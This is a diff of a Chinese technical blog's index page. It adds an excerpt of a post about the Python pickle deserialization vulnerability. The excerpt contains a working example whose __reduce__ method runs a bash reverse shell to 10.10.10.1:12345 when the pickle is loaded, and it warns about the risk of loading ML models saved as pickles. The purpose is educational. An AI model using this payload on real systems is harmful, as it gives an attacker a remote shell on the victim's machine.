@@ -106,6 +106,85 @@
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <header class="post-header">
       <h1 class="post-title" itemprop="name headline">
+        <a class="post-title-link" href="http://lanlingzi.cn/post/technical/2021/0313_code/" itemprop="url">
+        飞哥讲代码24：从Python Pickle漏洞说起
+        </a>
+      </h1>
+      <div class="post-meta">
+      <span class="post-time">
+<span class="post-meta-item-icon">
+    <i class="fa fa-calendar-o"></i>
+</span>
+<span class="post-meta-item-text">时间：</span>
+<time itemprop="dateCreated" datetime="2016-03-22T13:04:35+08:00" content="2021-03-13">
+    2021-03-13
+</time>
+</span> 
+      
+
+  <span class="post-category" >
+  &nbsp; | &nbsp;
+  <span class="post-meta-item-icon">
+    <i class="fa fa-folder-o"></i>
+  </span>
+  <span class="post-meta-item-text">分类：</span>
+  
+    <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+      <a href="http://lanlingzi.cn/categories/%E6%8A%80%E6%9C%AF" itemprop="url" rel="index">
+        <span itemprop="name">技术</span>
+      </a>
+      &nbsp; 
+    </span>
+  
+</span>
+
+
+       <span>
+&nbsp; | &nbsp;
+<span class="post-meta-item-icon">
+    <i class="fa fa-eye"></i>
+</span>
+<span class="post-meta-item-text">阅读：</span>
+<span class="leancloud-visitors-count">3848 字 ~8分钟</span>
+</span>
+      </div>
+    </header>
+    <div class="post-body" itemprop="articleBody">
+    <blockquote>
+<p>《泾溪》&ndash; 杜荀鹤<br>
+泾溪石险人兢慎，终岁不闻倾覆人。<br>
+却是平流无石处，时时闻说有沉沦。</p>
+</blockquote>
+<h1 id="案例">案例</h1>
+<p>有次同事找我看个Python的安全问题。测试代码是这样的：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">pickle</span>
+<span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">os</span>
+
+<span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Test</span>(<span style="color:#658b00">object</span>):
+    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">__reduce__</span>(self):
+        cmd = <span style="color:#cd5555">&#34;&#34;&#34;bash -i &amp;&gt; /dev/tcp/10.10.10.1/12345 0&gt;&amp;1 2&gt;&amp;1&#34;&#34;&#34;</span>
+        <span style="color:#8b008b;font-weight:bold">return</span> (os.system,(cmd,))
+
+<span style="color:#8b008b;font-weight:bold">if</span> __name__ == <span style="color:#cd5555">&#34;__main__&#34;</span>:
+    test = Test()
+    bs = pickle.dumps(test)
+    pickle.loads(bs)
+</code></pre></div><p>这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。</p>
+<p>目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。</p>
+    </div>
+    
+    <div class="post-more-link text-center">
+    <a class="btn" href="http://lanlingzi.cn/post/technical/2021/0313_code/" rel="contents">
+      阅读全文 &raquo;
+    </a>
+    </div>
+    
+    <footer class="post-footer"><div class="post-eof"></div></footer>
+  </article>
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">
         <a class="post-title-link" href="http://lanlingzi.cn/post/technical/2021/0307_code/" itemprop="url">
         飞哥讲代码23：C/C&#43;&#43;内存空洞
         </a>
@@ -649,69 +728,6 @@
     <footer class="post-footer"><div class="post-eof"></div></footer>
   </article>
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">
-        <a class="post-title-link" href="http://lanlingzi.cn/post/technical/2020/1114_tech_stack/" itemprop="url">
-        程序员编码技术栈
-        </a>
-      </h1>
-      <div class="post-meta">
-      <span class="post-time">
-<span class="post-meta-item-icon">
-    <i class="fa fa-calendar-o"></i>
-</span>
-<span class="post-meta-item-text">时间：</span>
-<time itemprop="dateCreated" datetime="2016-03-22T13:04:35+08:00" content="2020-11-15">
-    2020-11-15
-</time>
-</span> 
-      
-
-  <span class="post-category" >
-  &nbsp; | &nbsp;
-  <span class="post-meta-item-icon">
-    <i class="fa fa-folder-o"></i>
-  </span>
-  <span class="post-meta-item-text">分类：</span>
-  
-    <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-      <a href="http://lanlingzi.cn/categories/%E6%8A%80%E6%9C%AF" itemprop="url" rel="index">
-        <span itemprop="name">技术</span>
-      </a>
-      &nbsp; 
-    </span>
-  
-</span>
-
-
-       <span>
-&nbsp; | &nbsp;
-<span class="post-meta-item-icon">
-    <i class="fa fa-eye"></i>
-</span>
-<span class="post-meta-item-text">阅读：</span>
-<span class="leancloud-visitors-count">4967 字 ~10分钟</span>
-</span>
-      </div>
-    </header>
-    <div class="post-body" itemprop="articleBody">
-    <h1 id="写在前面">写在前面</h1>
-<p>偶尔会有同学来问我：&ldquo;飞哥，我在学校是学java，来公司却安排搞c++，我不喜欢，怎么办？&rdquo;</p>
-<p>让人信服地回答这个问题其实很难。我的理解是无论什么语言，本质是要服务业务，无论是java还是c++，他们都是实现业务软件的工具。在工作中，我们要尽可能多的去掌握一些固化不变的基础，越基础的知识点越具有通用性，掌握会让自己变得更有竞争力。各种编程语言在语法上可能有着相同又有不同的地方，有着他们各自最佳适合的场景。透过语法层面来看，似乎我们总是能找到一些共同的基础知识体系。当你了解并熟悉这些知识点之后，可能不会再纠结是选java还是其它了。</p>
-<p>当然并不是语言层面的知识不再需要深入掌握，而是当工作选择需要你掌握哪种语言时，就去学习了解哪种语言。有了一些公共基础，也会触类旁通，学习起来更轻松。</p>
-<p>本文试图抛开具体的语言，列出提纲梳理背后共同的技术栈，希望能给正在处于纠结选择语言的同学一些帮助。由于笔者能力、精力都有限，部分内容也是从网上收集整理，其中可能存在理解上偏差与错误。</p>
-    </div>
-    
-    <div class="post-more-link text-center">
-    <a class="btn" href="http://lanlingzi.cn/post/technical/2020/1114_tech_stack/" rel="contents">
-      阅读全文 &raquo;
-    </a>
-    </div>
-    
-    <footer class="post-footer"><div class="post-eof"></div></footer>
-  </article>
-
 </section>
 
 
@@ -837,7 +853,7 @@
       <nav class="site-state motion-element">
     <div class="site-state-item site-state-posts">
       <a href="http://lanlingzi.cn/post/">
-        <span class="site-state-item-count">155</span>
+        <span class="site-state-item-count">156</span>
         <span class="site-state-item-name">日志</span>
       </a>
     </div>
